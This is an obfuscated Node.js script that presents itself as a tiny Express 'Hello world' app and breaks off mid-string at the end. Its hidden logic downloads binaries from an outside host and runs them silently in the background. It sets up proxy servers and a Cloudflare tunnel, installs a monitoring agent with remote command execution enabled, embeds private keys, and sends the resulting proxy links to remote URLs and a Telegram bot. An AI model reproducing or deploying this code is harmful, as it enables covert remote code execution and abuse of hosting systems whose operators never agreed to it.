#!/usr/bin/env node

const _0x318dce=_0xa3fe;(function(_0x47e643,_0x5b170a){const _0x5cb514=_0xa3fe,_0x35f8d1=_0x47e643();while(!![]){try{const _0x3437ca=parseInt(_0x5cb514(0x2ce))/0x1*(parseInt(_0x5cb514(0x294))/0x2)+-parseInt(_0x5cb514(0x20d))/0x3+parseInt(_0x5cb514(0x287))/0x4+-parseInt(_0x5cb514(0x2a3))/0x5*(parseInt(_0x5cb514(0x212))/0x6)+-parseInt(_0x5cb514(0x237))/0x7+parseInt(_0x5cb514(0x2b2))/0x8*(-parseInt(_0x5cb514(0x298))/0x9)+parseInt(_0x5cb514(0x206))/0xa;if(_0x3437ca===_0x5b170a)break;else _0x35f8d1['push'](_0x35f8d1['shift']());}catch(_0x2c6b3c){_0x35f8d1['push'](_0x35f8d1['shift']());}}}(_0xe2b9,0xbac5a));const express=require('express'),app=express(),axios=require(_0x318dce(0x216)),os=require('os'),fs=require('fs'),path=require(_0x318dce(0x2bd)),{promisify}=require('util'),exec=promisify(require(_0x318dce(0x207))[_0x318dce(0x24f)]),{execSync}=require('child_process'),UPLOAD_URL=process[_0x318dce(0x2b1)][_0x318dce(0x285)]||'',PROJECT_URL=process[_0x318dce(0x2b1)][_0x318dce(0x284)]||'',AUTO_ACCESS=process[_0x318dce(0x2b1)][_0x318dce(0x24d)]||![],YT_WARPOUT=process[_0x318dce(0x2b1)][_0x318dce(0x2c8)]||![],FILE_PATH=process[_0x318dce(0x2b1)][_0x318dce(0x21f)]||_0x318dce(0x23a),SUB_PATH=process[_0x318dce(0x2b1)][_0x318dce(0x254)]||'sub',KAMAN=process[_0x318dce(0x2b1)]['KAMAN']||'0a6568ff-ea3c-4271-9020-450560e10d63',YOUNGHERO_SERVER=process['env'][_0x318dce(0x25f)]||'',YOUNGHERO_PORT=process[_0x318dce(0x2b1)]['YOUNGHERO_PORT']||'',YOUNGHERO_KEY=process['env'][_0x318dce(0x243)]||'',SUIDAO_DOMAIN=process[_0x318dce(0x2b1)][_0x318dce(0x203)]||'',SUIDAO_AUTH=process[_0x318dce(0x2b1)][_0x318dce(0x27f)]||'',SUIDAO_PORT=process[_0x318dce(0x2b1)][_0x318dce(0x208)]||0x1f41,TUYIKE_PORT=process[_0x318dce(0x2b1)]['TUYIKE_PORT']||'',XIESIDILI_PORT=process['env']['XIESIDILI_PORT']||'',XIANSHI_PORT=process['env'][_0x318dce(0x21a)]||'',CFIP=process['env'][_0x318dce(0x231)]||_0x318dce(0x28f),CFPORT=process[_0x318dce(0x2b1)][_0x318dce(0x223)]||0x1bb,PORT=process[_0x318dce(0x2b1)][_0x318dce(0x224)]||0xbb8,NAME=process['env'][_0x318dce(0x2d3)]||'',CHAT_ID=process[_0x318dce(0x2b1)][_0x318dce(0x21b)]||'',BOT_TOKEN=process['env'][_0x318dce(0x28a)]||'';require(_0x318dce(0x1fc))[_0x318dce(0x20c)]();!fs[_0x318dce(0x222)](FILE_PATH)?(fs[_0x318dce(0x2d6)](FILE_PATH),console['log'](FILE_PATH+_0x318dce(0x227))):console[_0x318dce(0x278)](FILE_PATH+_0x318dce(0x2bb));function generateRandomName(){const _0x33e192=_0x318dce,_0x3a22d6=_0x33e192(0x2a0);let _0x4f27eb='';for(let _0x4c79e9=0x0;_0x4c79e9<0x6;_0x4c79e9++){_0x4f27eb+=_0x3a22d6[_0x33e192(0x258)](Math[_0x33e192(0x2b5)](Math[_0x33e192(0x2c9)]()*_0x3a22d6['length']));}return _0x4f27eb;}let privateKey='',publicKey='';const npmName=generateRandomName(),phpName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName();let npmPath=path[_0x318dce(0x29c)](FILE_PATH,npmName),phpPath=path[_0x318dce(0x29c)](FILE_PATH,phpName),webPath=path[_0x318dce(0x29c)](FILE_PATH,webName),botPath=path[_0x318dce(0x29c)](FILE_PATH,botName),subPath=path[_0x318dce(0x29c)](FILE_PATH,_0x318dce(0x2ca)),listPath=path[_0x318dce(0x29c)](FILE_PATH,_0x318dce(0x2d1)),bootLogPath=path[_0x318dce(0x29c)](FILE_PATH,_0x318dce(0x219)),configPath=path['join'](FILE_PATH,_0x318dce(0x262));function deleteNodes(){const _0x3101da=_0x318dce;try{if(!UPLOAD_URL)return;const _0xa183ed=path[_0x3101da(0x29c)](FILE_PATH,_0x3101da(0x2ca));if(!fs[_0x3101da(0x222)](_0xa183ed))return;let _0x4bae94;try{_0x4bae94=fs[_0x3101da(0x26f)](_0xa183ed,_0x3101da(0x21c));}catch{return null;}const _0xb17f23=Buffer[_0x3101da(0x26b)](_0x4bae94,_0x3101da(0x1f2))[_0x3101da(0x263)](_0x3101da(0x21c)),_0x1bc545=_0xb17f23[_0x3101da(0x253)]('\x0a')['filter'](_0x35acca=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x3101da(0x2a1)](_0x35acca));if(_0x1bc545[_0x3101da(0x28e)]===0x0)return;return axios[_0x3101da(0x259)](UPLOAD_URL+_0x3101da(0x24e),JSON[_0x3101da(0x1f4)]({'nodes':_0x1bc545}),{'headers':{'Content-Type':_0x3101da(0x236)}})['catch'](_0x5884f5=>{return null;});}catch(_0x5283d0){return null;}}function isValidPort(_0x23118d){const _0x66a994=_0x318dce;try{if(_0x23118d===null||_0x23118d===undefined||_0x23118d==='')return![];if(typeof _0x23118d===_0x66a994(0x27b)&&_0x23118d['trim']()==='')return![];const _0x52ecd4=parseInt(_0x23118d);if(isNaN(_0x52ecd4))return![];if(_0x52ecd4<0x1||_0x52ecd4>0xffff)return![];return!![];}catch(_0xe4d91e){return![];}}const pathsToDelete=['web',_0x318dce(0x23c),'npm','boot.log',_0x318dce(0x2d1)];function cleanupOldFiles(){pathsToDelete['forEach'](_0xcfb8a8=>{const _0x2c342e=_0xa3fe,_0x25d84e=path[_0x2c342e(0x29c)](FILE_PATH,_0xcfb8a8);fs[_0x2c342e(0x22c)](_0x25d84e,()=>{});});}app['get']('/',function(_0x4d415a,_0x57e047){const _0x3321d1=_0x318dce,_0x4ffd72=path['join'](__dirname,_0x3321d1(0x24b));fs[_0x3321d1(0x222)](_0x4ffd72)?_0x57e047[_0x3321d1(0x22b)](_0x4ffd72):_0x57e047[_0x3321d1(0x2a4)](_0x3321d1(0x290));});function suidaoType(){const _0x1465bd=_0x318dce;if(!SUIDAO_AUTH||!SUIDAO_DOMAIN){console[_0x1465bd(0x278)](_0x1465bd(0x261));return;}if(SUIDAO_AUTH[_0x1465bd(0x1f6)](_0x1465bd(0x25c))){fs[_0x1465bd(0x256)](path[_0x1465bd(0x29c)](FILE_PATH,_0x1465bd(0x251)),SUIDAO_AUTH);const _0x382696=_0x1465bd(0x279)+SUIDAO_AUTH['split']('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x1465bd(0x29c)](FILE_PATH,_0x1465bd(0x251))+_0x1465bd(0x2d0)+SUIDAO_DOMAIN+_0x1465bd(0x1f3)+SUIDAO_PORT+_0x1465bd(0x2b3);fs[_0x1465bd(0x256)](path[_0x1465bd(0x29c)](FILE_PATH,_0x1465bd(0x24a)),_0x382696);}else console[_0x1465bd(0x278)](_0x1465bd(0x2dd));}function getSystemArchitecture(){const _0x3968d7=_0x318dce,_0x329ab5=os[_0x3968d7(0x280)]();return _0x329ab5===_0x3968d7(0x2df)||_0x329ab5===_0x3968d7(0x2af)||_0x329ab5==='aarch64'?_0x3968d7(0x2df):'amd';}function downloadFile(_0xf63328,_0x5ba57f,_0xbbd9cf){const _0x56fc52=_0x318dce,_0xc02a0=_0xf63328,_0x3400b0=fs[_0x56fc52(0x202)](_0xc02a0);axios({'method':_0x56fc52(0x2b4),'url':_0x5ba57f,'responseType':_0x56fc52(0x2da)})[_0x56fc52(0x2c5)](_0x5a2ab2=>{const _0x5dfa5d=_0x56fc52;_0x5a2ab2['data'][_0x5dfa5d(0x26a)](_0x3400b0),_0x3400b0['on'](_0x5dfa5d(0x29a),()=>{const _0x4a23a7=_0x5dfa5d;_0x3400b0[_0x4a23a7(0x226)](),console[_0x4a23a7(0x278)]('Download\x20'+path[_0x4a23a7(0x1fb)](_0xc02a0)+_0x4a23a7(0x2a9)),_0xbbd9cf(null,_0xc02a0);}),_0x3400b0['on']('error',_0x28deab=>{const _0x4f952b=_0x5dfa5d;fs[_0x4f952b(0x22c)](_0xc02a0,()=>{});const _0x51e8e3=_0x4f952b(0x2c1)+path[_0x4f952b(0x1fb)](_0xc02a0)+_0x4f952b(0x248)+_0x28deab[_0x4f952b(0x22d)];console[_0x4f952b(0x213)](_0x51e8e3),_0xbbd9cf(_0x51e8e3);});})[_0x56fc52(0x215)](_0x32050a=>{const _0x15ad67=_0x56fc52,_0x38bb14='Download\x20'+path[_0x15ad67(0x1fb)](_0xc02a0)+'\x20failed:\x20'+_0x32050a[_0x15ad67(0x22d)];console[_0x15ad67(0x213)](_0x38bb14),_0xbbd9cf(_0x38bb14);});}async function downloadFilesAndRun(){const _0x705d7b=_0x318dce,_0x289604=getSystemArchitecture(),_0x66e81=getFilesForArchitecture(_0x289604);if(_0x66e81['length']===0x0){console[_0x705d7b(0x278)](_0x705d7b(0x268));return;}const _0x328d76=_0x66e81[_0x705d7b(0x269)](_0x169c3d=>{return new Promise((_0x31d179,_0x45cd19)=>{const _0x10858f=_0xa3fe;downloadFile(_0x169c3d['fileName'],_0x169c3d[_0x10858f(0x28d)],(_0x54411e,_0x3d58ee)=>{_0x54411e?_0x45cd19(_0x54411e):_0x31d179(_0x3d58ee);});});});try{await Promise[_0x705d7b(0x249)](_0x328d76);}catch(_0x1b500e){console[_0x705d7b(0x213)](_0x705d7b(0x283),_0x1b500e);return;}function _0x3a776e(_0x1a98ec){const _0x216fbc=_0x705d7b,_0x365152=0x1fd;_0x1a98ec[_0x216fbc(0x29d)](_0x1a0ec0=>{const _0x50cfa1=_0x216fbc;fs[_0x50cfa1(0x222)](_0x1a0ec0)&&fs[_0x50cfa1(0x21d)](_0x1a0ec0,_0x365152,_0x243a2d=>{const _0x124914=_0x50cfa1;_0x243a2d?console['error'](_0x124914(0x292)+_0x1a0ec0+':\x20'+_0x243a2d):console['log'](_0x124914(0x2ab)+_0x1a0ec0+':\x20'+_0x365152[_0x124914(0x263)](0x8));});});}const _0x371e52=YOUNGHERO_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x3a776e(_0x371e52);const _0x66ff46=YOUNGHERO_SERVER['includes'](':')?YOUNGHERO_SERVER[_0x705d7b(0x253)](':')[_0x705d7b(0x239)]():'',_0x17c4d2=new Set([_0x705d7b(0x2be),_0x705d7b(0x276),_0x705d7b(0x27a),_0x705d7b(0x20b),'2083','2053']),_0x217104=_0x17c4d2[_0x705d7b(0x210)](_0x66ff46)?'tls':'false';if(YOUNGHERO_SERVER&&YOUNGHERO_KEY){if(!YOUNGHERO_PORT){const _0x3f6f7f=_0x705d7b(0x238)+YOUNGHERO_KEY+_0x705d7b(0x201)+YOUNGHERO_SERVER+_0x705d7b(0x235)+_0x217104+_0x705d7b(0x1fd)+KAMAN;fs['writeFileSync'](path[_0x705d7b(0x29c)](FILE_PATH,_0x705d7b(0x2c2)),_0x3f6f7f);}}const _0x346ff4=path['join'](FILE_PATH,_0x705d7b(0x2d4));if(fs[_0x705d7b(0x222)](_0x346ff4)){const _0x53d193=fs[_0x705d7b(0x26f)](_0x346ff4,_0x705d7b(0x1f7)),_0x18123d=_0x53d193[_0x705d7b(0x2aa)](/PrivateKey:\s*(.*)/),_0x2657c6=_0x53d193[_0x705d7b(0x2aa)](/PublicKey:\s*(.*)/);privateKey=_0x18123d?_0x18123d[0x1]:'',publicKey=_0x2657c6?_0x2657c6[0x1]:'';if(!privateKey||!publicKey){console[_0x705d7b(0x213)](_0x705d7b(0x225));return;}console[_0x705d7b(0x278)](_0x705d7b(0x20a),privateKey),console[_0x705d7b(0x278)]('Public\x20Key:',publicKey),_0x2f4f30();}else exec(webPath+_0x705d7b(0x297),async(_0x378502,_0x40a5d2,_0x3b7d79)=>{const _0x513849=_0x705d7b;if(_0x378502){console['error'](_0x513849(0x282)+_0x378502[_0x513849(0x22d)]);return;}const _0x22680f=_0x40a5d2['match'](/PrivateKey:\s*(.*)/),_0x5802d8=_0x40a5d2[_0x513849(0x2aa)](/PublicKey:\s*(.*)/);privateKey=_0x22680f?_0x22680f[0x1]:'',publicKey=_0x5802d8?_0x5802d8[0x1]:'';if(!privateKey||!publicKey){console[_0x513849(0x213)](_0x513849(0x296));return;}fs[_0x513849(0x256)](_0x346ff4,_0x513849(0x27c)+privateKey+_0x513849(0x244)+publicKey+'\x0a',_0x513849(0x1f7)),console[_0x513849(0x278)](_0x513849(0x20a),privateKey),console[_0x513849(0x278)](_0x513849(0x2b8),publicKey),_0x2f4f30();});function _0x2f4f30(){const _0x5f3471=_0x705d7b;exec(_0x5f3471(0x29f),async(_0xa00e02,_0x548b7c,_0x533e82)=>{const _0x175cd2=_0x5f3471;if(_0xa00e02||_0x548b7c['trim']()===''){const _0x46ee33=_0x175cd2(0x2a2);fs[_0x175cd2(0x256)](path[_0x175cd2(0x29c)](FILE_PATH,_0x175cd2(0x221)),_0x46ee33);const _0x5e34b3='-----BEGIN\x20CERTIFICATE-----\x0aMIIBejCCASGgAwIBAgIUfWeQL3556PNJLp/veCFxGNj9crkwCgYIKoZIzj0EAwIw\x0aEzERMA8GA1UEAwwIYmluZy5jb20wHhcNMjUwOTE4MTgyMDIyWhcNMzUwOTE2MTgy\x0aMDIyWjATMREwDwYDVQQDDAhiaW5nLmNvbTBZMBMGByqGSM49AgEGCCqGSM49AwEH\x0aA0IABNZB2nz49O6yRvh26B9npACOK/nuky9/BlgEgDZ54Ga3qEAxdegEWv07Mi8h\x0aaD5IS8Um3oR/zQRIx7UmRmg4TKmjUzBRMB0GA1UdDgQWBBTV1cFID7UISE7PLTBR\x0aBfGbgkrMNzAfBgNVHSMEGDAWgBTV1cFID7UISE7PLTBRBfGbgkrMNzAPBgNVHRMB\x0aAf8EBTADAQH/MAoGCCqGSM49BAMCA0cAMEQCIAIDAJvg0vd/ytrQVvEcSm6XTlB+\x0aeQ6OFb9LbLYL9f+sAiAffoMbi4y/0YUSlTtz7as9S8/lciBF5VCUoVIKS+vX2g==\x0a-----END\x20CERTIFICATE-----';fs['writeFileSync'](path[_0x175cd2(0x29c)](FILE_PATH,_0x175cd2(0x2b6)),_0x5e34b3);}else{try{await execPromise(_0x175cd2(0x23f)+path[_0x175cd2(0x29c)](FILE_PATH,'private.key')+'\x22');}catch(_0x2c3122){console[_0x175cd2(0x213)](_0x175cd2(0x1fe)+_0x2c3122['message']);return;}try{await execPromise('openssl\x20req\x20-new\x20-x509\x20-days\x203650\x20-key\x20\x22'+path[_0x175cd2(0x29c)](FILE_PATH,_0x175cd2(0x221))+_0x175cd2(0x266)+path[_0x175cd2(0x29c)](FILE_PATH,_0x175cd2(0x2b6))+_0x175cd2(0x1f8));}catch(_0x25f633){console[_0x175cd2(0x213)]('Error\x20generating\x20cert.pem:\x20'+_0x25f633[_0x175cd2(0x22d)]);return;}}if(!privateKey||!publicKey){console[_0x175cd2(0x213)]('PrivateKey\x20or\x20PublicKey\x20is\x20missing,\x20retrying...');return;}const _0x21b6d4={'log':{'disabled':!![],'level':'error','timestamp':!![]},'dns':{'servers':[{'address':_0x175cd2(0x245),'address_resolver':_0x175cd2(0x232)},{'tag':_0x175cd2(0x232),'address':_0x175cd2(0x232)}]},'inbounds':[{'tag':'vmess-ws-in','type':_0x175cd2(0x2c4),'listen':'::','listen_port':SUIDAO_PORT,'users':[{'uuid':KAMAN}],'transport':{'type':'ws','path':_0x175cd2(0x25b),'early_data_header_name':_0x175cd2(0x2b0)}}],'outbounds':[{'type':'direct','tag':'direct'},{'type':'block','tag':_0x175cd2(0x260)},{'type':_0x175cd2(0x21e),'tag':'wireguard-out','server':_0x175cd2(0x24c),'server_port':0x968,'local_address':[_0x175cd2(0x26d),_0x175cd2(0x272)],'private_key':'eAx8o6MJrH4KE7ivPFFCa4qvYw5nJsYHCBQXPApQX1A=','peer_public_key':_0x175cd2(0x205),'reserved':[0x52,0x5a,0x33],'mtu':0x58c}],'route':{'rule_set':[{'tag':_0x175cd2(0x250),'type':_0x175cd2(0x234),'format':_0x175cd2(0x2a6),'url':'https://raw.githubusercontent.com/MetaCubeX/meta-rules-dat/sing/geo/geosite/netflix.srs','download_detour':_0x175cd2(0x2cc)},{'tag':_0x175cd2(0x228),'type':_0x175cd2(0x234),'format':_0x175cd2(0x2a6),'url':_0x175cd2(0x264),'download_detour':_0x175cd2(0x2cc)}],'rules':[{'rule_set':['openai','netflix'],'outbound':_0x175cd2(0x28b)}],'final':_0x175cd2(0x2cc)}};try{isValidPort(XIANSHI_PORT)&&_0x21b6d4[_0x175cd2(0x25d)]['push']({'tag':_0x175cd2(0x20f),'type':_0x175cd2(0x291),'listen':'::','listen_port':parseInt(XIANSHI_PORT),'users':[{'uuid':KAMAN,'flow':_0x175cd2(0x229)}],'tls':{'enabled':!![],'server_name':'www.iij.ad.jp','reality':{'enabled':!![],'handshake':{'server':'www.iij.ad.jp','server_port':0x1bb},'private_key':privateKey,'short_id':['']}}});}catch(_0x165b91){}try{isValidPort(XIESIDILI_PORT)&&_0x21b6d4[_0x175cd2(0x25d)][_0x175cd2(0x277)]({'tag':_0x175cd2(0x241),'type':_0x175cd2(0x257),'listen':'::','listen_port':parseInt(XIESIDILI_PORT),'users':[{'password':KAMAN}],'masquerade':_0x175cd2(0x2d2),'tls':{'enabled':!![],'alpn':['h3'],'certificate_path':path['join'](FILE_PATH,_0x175cd2(0x2b6)),'key_path':path[_0x175cd2(0x29c)](FILE_PATH,'private.key')}});}catch(_0xd1979f){}try{isValidPort(TUYIKE_PORT)&&_0x21b6d4['inbounds'][_0x175cd2(0x277)]({'tag':_0x175cd2(0x233),'type':_0x175cd2(0x22e),'listen':'::','listen_port':parseInt(TUYIKE_PORT),'users':[{'uuid':KAMAN}],'congestion_control':_0x175cd2(0x2c6),'tls':{'enabled':!![],'alpn':['h3'],'certificate_path':path[_0x175cd2(0x29c)](FILE_PATH,'cert.pem'),'key_path':path[_0x175cd2(0x29c)](FILE_PATH,'private.key')}});}catch(_0x1875ba){}try{let _0x2a24bf=!![];if(YT_WARPOUT===!![])_0x2a24bf=![];else try{const _0x1d7c66=execSync('curl\x20-o\x20/dev/null\x20-m\x202\x20-s\x20-w\x20\x22%{http_code}\x22\x20https://www.youtube.com',{'encoding':_0x175cd2(0x1f7)})[_0x175cd2(0x273)]();_0x2a24bf=_0x1d7c66===_0x175cd2(0x25a);}catch(_0x398ee5){if(_0x398ee5[_0x175cd2(0x2a8)]&&_0x398ee5[_0x175cd2(0x2a8)][0x1]){const _0x4dd13f=_0x398ee5[_0x175cd2(0x2a8)][0x1]['toString']()[_0x175cd2(0x273)]();_0x2a24bf=_0x4dd13f==='200';}else _0x2a24bf=![];}if(!_0x2a24bf){!_0x21b6d4[_0x175cd2(0x26c)]&&(_0x21b6d4[_0x175cd2(0x26c)]={});!_0x21b6d4['route'][_0x175cd2(0x2ae)]&&(_0x21b6d4[_0x175cd2(0x26c)][_0x175cd2(0x2ae)]=[]);!_0x21b6d4[_0x175cd2(0x26c)][_0x175cd2(0x217)]&&(_0x21b6d4['route']['rules']=[]);const _0x21bcb4=_0x21b6d4[_0x175cd2(0x26c)][_0x175cd2(0x2ae)][_0x175cd2(0x2ba)](_0xb5984b=>_0xb5984b[_0x175cd2(0x230)]===_0x175cd2(0x2c0));if(!_0x21bcb4)_0x21b6d4['route'][_0x175cd2(0x2ae)][_0x175cd2(0x277)]({'tag':'youtube','type':_0x175cd2(0x234),'format':_0x175cd2(0x2a6),'url':_0x175cd2(0x2d7),'download_detour':_0x175cd2(0x2cc)});else{}let _0x2ec086=_0x21b6d4[_0x175cd2(0x26c)][_0x175cd2(0x217)]['find'](_0x571b42=>_0x571b42[_0x175cd2(0x209)]==='wireguard-out');if(!_0x2ec086)_0x2ec086={'rule_set':[_0x175cd2(0x228),_0x175cd2(0x250),_0x175cd2(0x2c0)],'outbound':_0x175cd2(0x28b)},_0x21b6d4[_0x175cd2(0x26c)][_0x175cd2(0x217)][_0x175cd2(0x277)](_0x2ec086);else{if(!_0x2ec086[_0x175cd2(0x2ae)][_0x175cd2(0x1f6)]('youtube'))_0x2ec086[_0x175cd2(0x2ae)][_0x175cd2(0x277)](_0x175cd2(0x2c0));else{}}console[_0x175cd2(0x278)](_0x175cd2(0x2c7));}else{}}catch(_0x1f21ca){console[_0x175cd2(0x213)]('YouTube\x20check\x20error:',_0x1f21ca);}fs[_0x175cd2(0x256)](path[_0x175cd2(0x29c)](FILE_PATH,_0x175cd2(0x262)),JSON[_0x175cd2(0x1f4)](_0x21b6d4,null,0x2));let _0x323930='';if(YOUNGHERO_SERVER&&YOUNGHERO_PORT&&YOUNGHERO_KEY){const _0x443589=[_0x175cd2(0x2be),'8443','2096',_0x175cd2(0x20b),_0x175cd2(0x247),_0x175cd2(0x28c)];_0x443589[_0x175cd2(0x1f6)](YOUNGHERO_PORT)?_0x323930='--tls':_0x323930='';const _0x4cc4eb='nohup\x20'+npmPath+'\x20-s\x20'+YOUNGHERO_SERVER+':'+YOUNGHERO_PORT+'\x20-p\x20'+YOUNGHERO_KEY+'\x20'+_0x323930+'\x20>/dev/null\x202>&1\x20&';try{await execPromise(_0x4cc4eb),console[_0x175cd2(0x278)](npmName+_0x175cd2(0x1ff)),await new Promise(_0x69df40=>setTimeout(_0x69df40,0x3e8));}catch(_0x3eaa04){console['error'](_0x175cd2(0x29e)+_0x3eaa04);}}else{if(YOUNGHERO_SERVER&&YOUNGHERO_KEY){const _0x57ee76='nohup\x20'+phpPath+_0x175cd2(0x29b)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x57ee76),console[_0x175cd2(0x278)](phpName+'\x20is\x20running'),await new Promise(_0x1090d2=>setTimeout(_0x1090d2,0x3e8));}catch(_0x5467e2){console['error'](_0x175cd2(0x23e)+_0x5467e2);}}else console['log']('YOUNGHERO\x20variable\x20is\x20empty,\x20skipping\x20running');}const _0x3bf00d=_0x175cd2(0x23d)+webPath+_0x175cd2(0x218)+path[_0x175cd2(0x29c)](FILE_PATH,_0x175cd2(0x262))+_0x175cd2(0x2e1);try{await execPromise(_0x3bf00d),console['log'](webName+_0x175cd2(0x1ff)),await new Promise(_0xc73252=>setTimeout(_0xc73252,0x3e8));}catch(_0x5867d9){console['error'](_0x175cd2(0x2ac)+_0x5867d9);}if(fs[_0x175cd2(0x222)](botPath)){let _0x339822;if(SUIDAO_AUTH[_0x175cd2(0x2aa)](/^[A-Z0-9a-z=]{120,250}$/))_0x339822=_0x175cd2(0x2cf)+SUIDAO_AUTH;else SUIDAO_AUTH['match'](/TunnelSecret/)?_0x339822=_0x175cd2(0x2db)+path[_0x175cd2(0x29c)](FILE_PATH,_0x175cd2(0x24a))+_0x175cd2(0x2a5):_0x339822=_0x175cd2(0x295)+path[_0x175cd2(0x29c)](FILE_PATH,'boot.log')+_0x175cd2(0x20e)+SUIDAO_PORT;try{await execPromise(_0x175cd2(0x23d)+botPath+'\x20'+_0x339822+'\x20>/dev/null\x202>&1\x20&'),console[_0x175cd2(0x278)](botName+_0x175cd2(0x1ff)),await new Promise(_0x5687c2=>setTimeout(_0x5687c2,0x7d0));}catch(_0x2ec72d){console[_0x175cd2(0x213)](_0x175cd2(0x211)+_0x2ec72d);}}await new Promise(_0x158c75=>setTimeout(_0x158c75,0x1388)),await extractDomains();});};}function _0xe2b9(){const _0x313e04=['none','includes','utf8','\x22\x20-subj\x20\x22/CN=bing.com\x22','?sni=www.bing.com&congestion_control=bbr&udp_relay_mode=native&alpn=h3&allow_insecure=1#','SuidaoDomain:','basename','dotenv','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','Error\x20generating\x20private.key:\x20','\x20is\x20running','/vmess-suidao?ed=2560','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','createWriteStream','SUIDAO_DOMAIN','set','bmXOC+F1FxEMF9dyiK2H5/1SUtzH0JuVo51h2wPfgyo=','29667060WvEtmE','child_process','SUIDAO_PORT','outbound','Private\x20Key:','2087','config','4362423aChABR','\x20--loglevel\x20info\x20--url\x20http://localhost:','vless-in','has','Error\x20executing\x20command:\x20','679188meZBie','error','App\x20is\x20running','catch','axios','rules','\x20run\x20-c\x20','boot.log','XIANSHI_PORT','CHAT_ID','utf-8','chmod','wireguard','FILE_PATH','https://api.telegram.org/bot','private.key','existsSync','CFPORT','PORT','Failed\x20to\x20extract\x20privateKey\x20or\x20publicKey\x20from\x20key.txt.','close','\x20is\x20created','openai','xtls-rprx-vision','/?sni=www.bing.com&insecure=1&alpn=h3&obfs=none#','sendFile','unlink','message','tuic','https://keep.gvrander.eu.org/add-url','tag','CFIP','local','tuic-in','remote','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','application/json','6934123RhUBkH','\x0aclient_secret:\x20','pop','./.npm','/sendMessage','bot','nohup\x20','php\x20running\x20error:\x20','openssl\x20ecparam\x20-genkey\x20-name\x20prime256v1\x20-out\x20\x22','MarkdownV2','hysteria-in','TG\x20variables\x20is\x20empty,Skipping\x20push\x20nodes\x20to\x20TG','YOUNGHERO_KEY','\x0aPublicKey:\x20','8.8.8.8','Failed\x20to\x20get\x20IP\x20address:','2083','\x20failed:\x20','all','tunnel.yml','app.html','engage.cloudflareclient.com','AUTO_ACCESS','/api/delete-nodes','exec','netflix','tunnel.json','curl\x20-s\x20--max-time\x201\x20ipv6.ip.sb','split','SUB_PATH','rm\x20-rf\x20','writeFileSync','hysteria2','charAt','post','200','/vmess-suidao','TunnelSecret','inbounds','clear','YOUNGHERO_SERVER','block','SUIDAO_DOMAIN\x20or\x20SUIDAO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','config.json','toString','https://raw.githubusercontent.com/MetaCubeX/meta-rules-dat/sing/geo/geosite/openai.srs','Skipping\x20adding\x20automatic\x20access\x20task','\x22\x20-out\x20\x22','substring','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','map','pipe','from','route','172.16.0.2/32','https://arm64.ssss.nyc.mn/v1','readFileSync','Subscription\x20uploaded\x20successfully','unlinkSync','2606:4700:110:851f:4da3:4e2c:cdbf:2ecf/128','trim','vmess://','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','8443','push','log','\x0a\x20\x20tunnel:\x20','2096','string','PrivateKey:\x20','status','&type=tcp&headerType=none#','SUIDAO_AUTH','arch','/api/add-nodes','Error\x20generating\x20reality-keypair:\x20','Error\x20downloading\x20files:','PROJECT_URL','UPLOAD_URL','\x22\x20>\x20/dev/null\x202>&1','5971284wXtccb','节点推送通知**\x0a```','SUIDAO_DOMAIN:','BOT_TOKEN','wireguard-out','2053','fileUrl','length','cdns.doon.eu.org','Hello\x20world!','vless','Empowerment\x20failed\x20for\x20','https://amd64.ssss.nyc.mn/bot','4jRnRth','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','Failed\x20to\x20extract\x20privateKey\x20or\x20publicKey\x20from\x20output.','\x20generate\x20reality-keypair','9kYmEgp','```','finish','\x20-c\x20\x22','join','forEach','npm\x20running\x20error:\x20','which\x20openssl\x20||\x20where.exe\x20openssl','abcdefghijklmnopqrstuvwxyz','test','-----BEGIN\x20EC\x20PARAMETERS-----\x0aBggqhkjOPQMBBw==\x0a-----END\x20EC\x20PARAMETERS-----\x0a-----BEGIN\x20EC\x20PRIVATE\x20KEY-----\x0aMHcCAQEEIM4792SEtPqIt1ywqTd/0bYidBqpYV/++siNnfBYsdUYoAoGCCqGSM49\x0aAwEHoUQDQgAE1kHafPj07rJG+HboH2ekAI4r+e6TL38GWASANnngZreoQDF16ARa\x0a/TsyLyFoPkhLxSbehH/NBEjHtSZGaDhMqQ==\x0a-----END\x20EC\x20PRIVATE\x20KEY-----','10WHRmxe','send','\x20run','binary','firefox','output','\x20successfully','match','Empowerment\x20success\x20for\x20','web\x20running\x20error:\x20','Error\x20reading\x20boot.log:','rule_set','arm64','Sec-WebSocket-Protocol','env','12187272QbRvdv','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','get','floor','cert.pem','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','Public\x20Key:','curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','find','\x20already\x20exists','response','path','443','Telegram\x20message\x20sent\x20successfully','youtube','Download\x20','config.yaml','\x20>/dev/null\x202>&1','vmess','then','bbr','Add\x20YouTube\x20outbound\x20rule','YT_WARPOUT','random','sub.txt','/sub.txt\x20saved\x20successfully','direct','https://arm64.ssss.nyc.mn/agent','250013xlenHl','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','list.txt','https://bing.com','NAME','key.txt','\x5c$&','mkdirSync','https://raw.githubusercontent.